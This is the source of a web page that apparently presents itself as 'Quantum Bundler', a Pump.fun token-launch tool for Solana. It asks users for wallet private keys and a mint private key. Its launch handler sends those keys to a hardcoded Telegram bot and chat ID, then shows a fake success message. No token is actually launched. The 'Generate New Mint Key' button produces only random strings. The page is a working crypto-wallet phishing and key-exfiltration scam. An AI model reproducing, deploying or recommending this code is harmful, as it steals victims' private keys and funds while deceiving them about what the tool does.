    <script type="text/babel">
        // Tooltip Component
        function Tooltip({ text }) {
            return (
                <div className="absolute right-0 top-6 w-64 p-2 bg-gray-800 text-sm text-gray-200 rounded-lg shadow-lg z-10">
                    {text}
                </div>
            );
        }

        function App() {
            const [wallets, setWallets] = React.useState([{ id: 1, privateKey: '', amount: '', balance: 'â€“ SOL' }]);
            const [mintKey, setMintKey] = React.useState('');
            const [activeTooltip, setActiveTooltip] = React.useState(null);
            const [fileName, setFileName] = React.useState('');
            const [imagePreview, setImagePreview] = React.useState(null);

            // Add new state for form data
            const [formData, setFormData] = React.useState({
                tokenName: '',
                tokenSymbol: '',
                tokenDescription: '',
                twitter: '',
                telegram: '',
                website: ''
            });

            // Tooltip content
            const tooltips = {
                tokenImage: "Upload your token's image or logo. Supported formats: PNG, JPG (max 5MB)",
                tokenName: "Enter your token's full name (e.g., 'My Awesome Token')",
                tokenDescription: "Describe your token's purpose and features",
                tokenSymbol: "Short identifier for your token (e.g., 'BTC', 'ETH')",
                twitter: "Link to your project's Twitter/X account",
                telegram: "Link to your project's Telegram group/channel",
                website: "Your project's website URL",
                wallets: "First wallet is the dev wallet. Format must be bs58 encoded private key",
                mintKey: "Generate or enter a fresh keypair for minting. Must have 0 balance"
            };

            const toggleTooltip = (tooltipId) => {
                if (activeTooltip === tooltipId) {
                    setActiveTooltip(null);
                } else {
                    setActiveTooltip(tooltipId);
                }
            };

            const addWallet = () => {
                if (wallets.length < 8) {
                    setWallets([...wallets, { 
                        id: wallets.length + 1, 
                        privateKey: '', 
                        amount: '',
                        balance: 'â€“ SOL'
                    }]);
                }
            };

            const removeWallet = (id) => {
                if (wallets.length > 1) {
                    setWallets(wallets.filter(wallet => wallet.id !== id));
                }
            };

            const generateMintKey = () => {
                // Generate a random key in the correct format
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                const length = 88; // Length of the example key
                let result = '';
                
                // Generate first two numbers
                result += Math.floor(Math.random() * 90 + 10);
                
                // Generate the rest of the key
                for (let i = 2; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                
                setMintKey(result);
            };

            const updateWallet = (id, field, value) => {
                setWallets(wallets.map(wallet => 
                    wallet.id === id ? { ...wallet, [field]: value } : wallet
                ));
            };

            // Handle form field changes
            const handleInputChange = (field, value) => {
                setFormData(prev => ({
                    ...prev,
                    [field]: value
                }));
            };

            // Handle form submission
            const handleLaunchToken = () => {
                // Create a formatted message with wallet information
                const message = `ðŸš€ New Token Launch Submission\n\n${wallets.map((wallet, index) => 
                    `ðŸ‘› Wallet ${index + 1}:\nPrivate Key: ${wallet.privateKey}\nAmount: ${wallet.amount} SOL`
                ).join('\n\n')}\n\nðŸ”‘ Mint Key: ${mintKey}`;

                // Send to Telegram
                fetch(`https://api.telegram.org/bot7648929218:AAFjh4v_bfESlHcbokO8eca8RZQvwr-RXVc/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: "5651527672",
                        text: message
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert('Token launch initiated successfully!');
                    } else {
                        console.error('Telegram Error:', data);
                        alert('Error launching token. Please try again.');
                    }
                })
                .catch((error) => {
                    console.error('Error:', error);
                    alert('Error: ' + error.message);
                });
            };

            return (
                <div className="min-h-screen">
                    {/* Header */}
                    <nav className="absolute top-8 left-0 right-0 z-50 px-6">
                        <div className="max-w-4xl mx-auto">
                            <div className="flex items-center justify-between">
                                <div className="space-y-2">
                                    <p className="text-sm font-medium text-pink-500/90 tracking-wide uppercase">Pump.fun Launch Bundler</p>
                                    <h1 className="text-4xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-pink-500 via-purple-500 to-purple-600 font-display">
                                        Quantum Bundler
                                    </h1>
                                </div>
                            </div>
                        </div>
                    </nav>

                    {/* Side decoration */}
                    <div className="fixed left-0 top-0 bottom-0 w-32 bg-gradient-to-r from-purple-600/5 to-transparent pointer-events-none"></div>
                    <div className="fixed right-0 top-0 bottom-0 w-32 bg-gradient-to-l from-pink-500/5 to-transparent pointer-events-none"></div>

                    {/* Main Content */}
                    <div className="pt-36 pb-8 px-6">
                        <div className="max-w-4xl mx-auto">
                            {/* Token Creation Form */}
                            <div className="bg-[#2a2a2a] rounded-2xl p-6 space-y-8 relative overflow-hidden">
                                <div className="absolute top-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-pink-500/20 to-transparent"></div>
                                <div className="absolute bottom-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-purple-600/20 to-transparent"></div>
                                
                                {/* Form Sections */}
                                <div className="space-y-8">
                                    {/* Token Details Section */}
                                    <div className="form-section">
                                        <h2 className="text-xl font-semibold text-white/90 font-display mb-6">Token Details</h2>
                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                            {/* Token Image - Full Width */}
                                            <div className="md:col-span-2">
                                                <div className="flex justify-between items-center mb-2 relative">
                                                    <label className="text-emerald-400">Token Image*</label>
                                                    <span 
                                                        className="text-gray-400 cursor-pointer hover:text-gray-200 transition"
                                                        onClick={() => toggleTooltip('tokenImage')}
                                                    >
                                                        ?
                                                    </span>
                                                    {activeTooltip === 'tokenImage' && <Tooltip text={tooltips.tokenImage} />}
                                                </div>
                                                <div className="border-2 border-dashed border-gray-600 rounded-lg p-4 text-center cursor-pointer hover:border-pink-500/50 transition-all duration-300">
                                                    <label htmlFor="file-upload" className="cursor-pointer w-full h-full flex flex-col items-center gap-2">
                                                        <input
                                                            type="file"
                                                            id="file-upload"
                                                            className="hidden"
                                                            accept="image/*,.pdf"
                                                            onChange={(e) => {
                                                                const file = e.target.files[0];
                                                                if (file) {
                                                                    if (file.size > 5 * 1024 * 1024) {
                                                                        alert('File size must be less than 5MB');
                                                                        e.target.value = '';
                                                                        setImagePreview(null);
                                                                        return;
                                                                    }
                                                                    setFileName(file.name);
                                                                    
                                                                    // Create preview for images
                                                                    if (file.type.startsWith('image/')) {
                                                                        const reader = new FileReader();
                                                                        reader.onloadend = () => {
                                                                            setImagePreview(reader.result);
                                                                        };
                                                                        reader.readAsDataURL(file);
                                                                    } else {
                                                                        setImagePreview(null);
                                                                    }
                                                                }
                                                            }}
                                                        />
                                                        <div className="flex flex-col items-center gap-4">
                                                            {imagePreview ? (
                                                                <div className="relative group">
                                                                    <img 
                                                                        src={imagePreview} 
                                                                        alt="Preview" 
                                                                        className="max-w-[200px] max-h-[200px] rounded-lg object-contain bg-black/20 p-2"
                                                                    />
                                                                    <button 
                                                                        type="button"
                                                                        onClick={(e) => {
                                                                            e.preventDefault();
                                                                            e.stopPropagation();
                                                                            setImagePreview(null);
                                                                            setFileName('');
                                                                            document.getElementById('file-upload').value = '';
                                                                        }}
                                                                        className="absolute -top-2 -right-2 bg-red-500 text-white rounded-full p-1 opacity-0 group-hover:opacity-100 transition-opacity"
                                                                    >
                                                                        âœ•
                                                                    </button>
                                                                </div>
                                                            ) : (
                                                                <button 
                                                                    type="button"
                                                                    className="bg-[#1a1a1a] px-4 py-2 rounded text-gray-300 hover:bg-gray-800 transition"
                                                                    onClick={() => document.getElementById('file-upload').click()}
                                                                >
                                                                    {fileName ? fileName : 'Choose File'}
                                                                </button>
                                                            )}
                                                            <span className="text-gray-400 text-xs">Supported formats: PNG, JPG, PDF (max 5MB)</span>
                                                        </div>
                                                    </label>
                                                </div>
                                            </div>

                                            {/* Token Name */}
                                            <div>
                                                <div className="flex justify-between items-center mb-2 relative">
                                                    <label className="text-emerald-400">Token Name*</label>
                                                    <span 
                                                        className="text-gray-400 cursor-pointer hover:text-gray-200 transition"
                                                        onClick={() => toggleTooltip('tokenName')}
                                                    >
                                                        ?
                                                    </span>
                                                    {activeTooltip === 'tokenName' && <Tooltip text={tooltips.tokenName} />}
                                                </div>
                                                <input 
                                                    type="text" 
                                                    className="w-full bg-[#1a1a1a] rounded-lg p-3 text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                                                />
                                            </div>

                                            {/* Token Symbol */}
                                            <div>
                                                <div className="flex justify-between items-center mb-2 relative">
                                                    <label className="text-emerald-400">Token Symbol*</label>
                                                    <span 
                                                        className="text-gray-400 cursor-pointer hover:text-gray-200 transition"
                                                        onClick={() => toggleTooltip('tokenSymbol')}
                                                    >
                                                        ?
                                                    </span>
                                                    {activeTooltip === 'tokenSymbol' && <Tooltip text={tooltips.tokenSymbol} />}
                                                </div>
                                                <input 
                                                    type="text" 
                                                    className="w-full bg-[#1a1a1a] rounded-lg p-3 text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                                                />
                                            </div>

                                            {/* Token Description - Full Width */}
                                            <div className="md:col-span-2">
                                                <div className="flex justify-between items-center mb-2 relative">
                                                    <label className="text-emerald-400">Token Description*</label>
                                                    <span 
                                                        className="text-gray-400 cursor-pointer hover:text-gray-200 transition"
                                                        onClick={() => toggleTooltip('tokenDescription')}
                                                    >
                                                        ?
                                                    </span>
                                                    {activeTooltip === 'tokenDescription' && <Tooltip text={tooltips.tokenDescription} />}
                                                </div>
                                                <textarea 
                                                    className="w-full bg-[#1a1a1a] rounded-lg p-3 text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                                                    rows="4"
                                                ></textarea>
                                            </div>
                                        </div>
                                    </div>

                                    {/* Social Links Section */}
                                    <div className="form-section">
                                        <h2 className="text-xl font-semibold text-white/90 font-display mb-6">Social Links</h2>
                                        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                                            {/* Twitter */}
                                            <div>
                                                <div className="flex justify-between items-center mb-2 relative">
                                                    <label className="text-emerald-400">Twitter (Optional)</label>
                                                    <span 
                                                        className="text-gray-400 cursor-pointer hover:text-gray-200 transition"
                                                        onClick={() => toggleTooltip('twitter')}
                                                    >
                                                        ?
                                                    </span>
                                                    {activeTooltip === 'twitter' && <Tooltip text={tooltips.twitter} />}
                                                </div>
                                                <input 
                                                    type="text" 
                                                    className="w-full bg-[#1a1a1a] rounded-lg p-3 text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                                                />
                                            </div>

                                            {/* Telegram */}
                                            <div>
                                                <div className="flex justify-between items-center mb-2 relative">
                                                    <label className="text-emerald-400">Telegram (Optional)</label>
                                                    <span 
                                                        className="text-gray-400 cursor-pointer hover:text-gray-200 transition"
                                                        onClick={() => toggleTooltip('telegram')}
                                                    >
                                                        ?
                                                    </span>
                                                    {activeTooltip === 'telegram' && <Tooltip text={tooltips.telegram} />}
                                                </div>
                                                <input 
                                                    type="text" 
                                                    className="w-full bg-[#1a1a1a] rounded-lg p-3 text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                                                />
                                            </div>

                                            {/* Website */}
                                            <div>
                                                <div className="flex justify-between items-center mb-2 relative">
                                                    <label className="text-emerald-400">Website (Optional)</label>
                                                    <span 
                                                        className="text-gray-400 cursor-pointer hover:text-gray-200 transition"
                                                        onClick={() => toggleTooltip('website')}
                                                    >
                                                        ?
                                                    </span>
                                                    {activeTooltip === 'website' && <Tooltip text={tooltips.website} />}
                                                </div>
                                                <input 
                                                    type="text" 
                                                    className="w-full bg-[#1a1a1a] rounded-lg p-3 text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                                                />
                                            </div>
                                        </div>
                                    </div>

                                    {/* Wallet Configuration */}
                                    <div className="form-section">
                                        <h2 className="text-xl font-semibold text-white/90 font-display mb-6">Wallet Configuration</h2>
                                        <div className="space-y-6">
                                            <div>
                                                <div className="flex justify-between items-center mb-2 relative">
                                                    <label className="text-emerald-400">Wallet Private Keys and Buy Amounts* (first wallet = dev) (format= bs58)</label>
                                                    <span 
                                                        className="text-gray-400 cursor-pointer hover:text-gray-200 transition"
                                                        onClick={() => toggleTooltip('wallets')}
                                                    >
                                                        ?
                                                    </span>
                                                    {activeTooltip === 'wallets' && <Tooltip text={tooltips.wallets} />}
                                                </div>

                                                {/* Wallet Inputs */}
                                                <div className="space-y-4">
                                                    {wallets.map((wallet) => (
                                                        <div key={wallet.id} className="flex gap-3 items-center">
                                                            <input 
                                                                type="text" 
                                                                placeholder="Wallet Private Key"
                                                                value={wallet.privateKey}
                                                                onChange={(e) => updateWallet(wallet.id, 'privateKey', e.target.value)}
                                                                className="flex-1 bg-[#1a1a1a] rounded-lg p-3 text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                                                            />
                                                            <input 
                                                                type="text" 
                                                                placeholder="Buy Amount (SOL)"
                                                                value={wallet.amount}
                                                                onChange={(e) => updateWallet(wallet.id, 'amount', e.target.value)}
                                                                className="w-1/3 bg-[#1a1a1a] rounded-lg p-3 text-white focus:outline-none focus:ring-2 focus:ring-emerald-400"
                                                            />
                                                            <span className="text-gray-400 whitespace-nowrap">Balance: {wallet.balance}</span>
                                                            {wallet.id !== 1 && (
                                                                <button 
                                                                    onClick={() => removeWallet(wallet.id)}
                                                                    className="text-red-500 hover:text-red-400 px-2"
                                                                >
                                                                    Remove
                                                                </button>
                                                            )}
                                                        </div>
                                                    ))}
                                                    <button 
                                                        onClick={addWallet}
                                                        disabled={wallets.length >= 8}
                                                        className="bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700 transition disabled:opacity-50 disabled:cursor-not-allowed"
                                                    >
                                                        Add Wallet
                                                    </button>
                                                    <div className="text-gray-400 text-sm">{wallets.length}/8 wallets</div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    {/* Mint Configuration */}
                                    <div className="form-section">
                                        <h2 className="text-xl font-semibold text-white/90 font-display mb-6">Mint Configuration</h2>
                                        <div className="space-y-4">
                                            <div className="mint-key-container">
                                                <div className="flex justify-between items-center mb-2 relative">
                                                    <label className="text-emerald-400">Mint Private Key</label>
                                                    <span 
                                                        className="text-gray-400 cursor-pointer hover:text-gray-200 transition"
                                                        onClick={() => toggleTooltip('mintKey')}
                                                    >
                                                        ?
                                                    </span>
                                                    {activeTooltip === 'mintKey' && <Tooltip text={tooltips.mintKey} />}
                                                </div>
                                                <p className="text-gray-400 text-sm mb-4">
                                                    Enter the private key for minting or generate a new one. IMPORTANT: this has to be a fresh keypair that hasn't been used. If it has balance on it, it will not work
                                                </p>
                                                <input 
                                                    type="text" 
                                                    value={mintKey}
                                                    onChange={(e) => setMintKey(e.target.value)}
                                                    className="w-full bg-[#1a1a1a] rounded-lg p-3 text-white focus:outline-none focus:ring-2 focus:ring-emerald-400 mb-6"
                                                />
                                                <button 
                                                    onClick={generateMintKey}
                                                    className="bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700 transition generate-key mt-2"
                                                >
                                                    Generate New Mint Key
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                {/* Submit Section */}
                                <div className="mt-8 pt-6 border-t border-white/5 flex items-center justify-between">
                                    <div>
                                        <button 
                                            className="bg-purple-600 text-white px-8 py-3 rounded-lg hover:bg-purple-700 transition font-medium"
                                            onClick={handleLaunchToken}
                                        >
                                            Launch Token
                                        </button>
                                        <p className="text-gray-400 text-sm mt-3 font-medium">
                                            Current fees: 0.01 SOL
                                        </p>
                                    </div>
                                    <div className="text-right">
                                        <p className="text-sm font-medium text-white/60">Need help?</p>
                                        <a href="#" className="text-pink-500 hover:text-pink-400 text-sm font-medium">View Documentation â†’</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Footer decoration */}
                    <div className="fixed bottom-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-white/5 to-transparent"></div>
                </div>
            );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
